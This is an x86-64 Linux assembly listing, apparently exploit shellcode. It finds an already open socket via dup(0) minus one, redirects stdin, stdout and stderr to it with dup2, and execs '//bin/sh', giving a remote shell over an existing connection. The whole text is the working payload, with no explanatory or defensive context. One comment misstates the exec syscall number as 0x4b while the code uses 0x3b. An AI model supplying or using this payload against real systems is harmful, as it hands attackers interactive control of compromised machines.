section .text
global _start
_start:
	;; s = Dup (0) - 1
	xor rax, rax
	push rax
	push rax
	push rax
	pop rsi
	pop rdx
	push rax
	pop rdi
	mov al, 32
	syscall    		; DUP (rax=32) rdi = 0 (dup (0))

	dec rax
	push rax
	pop rdi 		; mov rdi, rax  ; dec rdi

	;; dup2 (s, 0); dup2(s,1); dup2(s,2)
loop:	mov al, 33
	syscall			; DUP2 (rax=33) rdi=oldfd (socket) rsi=newfd
	inc rsi
	mov rax,rsi
	cmp al, 2		; Loop 0,1,2 (stdin, stdout, stderr)
	
	jne loop


	;; exec (/bin/sh)
	push    rdx			        ; NULL
	mov	qword rdi, 0x68732f6e69622f2f	; "//bin/sh"
	push	rdi				; command
	push 	rsp			
	pop 	rdi			
	
	push 	rdx		;env
	pop 	rsi		;args
	
        mov     al, 0x3b	;EXEC (rax=0x4b) rdi="/bin/sh" rsi=rdx=
        syscall
